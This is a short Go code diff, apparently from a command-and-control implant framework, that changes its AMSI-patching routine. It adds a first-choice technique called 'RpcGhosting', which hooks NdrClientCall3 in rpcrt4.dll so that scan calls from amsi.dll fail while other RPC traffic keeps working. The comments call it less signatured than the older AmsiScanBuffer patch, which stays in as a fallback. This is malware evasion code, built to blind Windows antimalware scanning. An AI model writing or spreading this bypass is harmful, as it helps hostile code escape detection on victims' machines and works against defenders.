@@ -219,8 +219,16 @@ func localTaskInner(data []byte, rwxPages bool) error {
 
 func patchAmsi() error {
 	// {{if .Config.Evasion}}
-	// Use dynamic hash-based patching first (xor eax,eax; ret → AMSI_RESULT_CLEAN)
-	err := evasion.DynamicPatchAmsi()
+	// Technique 1: RpcGhosting — selective NdrClientCall3 hook (RPC transport layer).
+	// Patches the NDR stub dispatch in rpcrt4.dll to return RPC_S_SERVER_UNAVAILABLE
+	// only for calls originating from amsi.dll. Less signatured than AmsiScanBuffer patching
+	// and preserves all non-AMSI RPC functionality (crypto, COM, TLS) via trampoline.
+	err := evasion.RpcGhosting()
+	if err == nil {
+		return nil
+	}
+	// Technique 2: Dynamic AmsiScanBuffer patch (hash-based, xor eax,eax; ret → AMSI_RESULT_CLEAN)
+	err = evasion.DynamicPatchAmsi()
 	if err == nil {
 		return nil
 	}
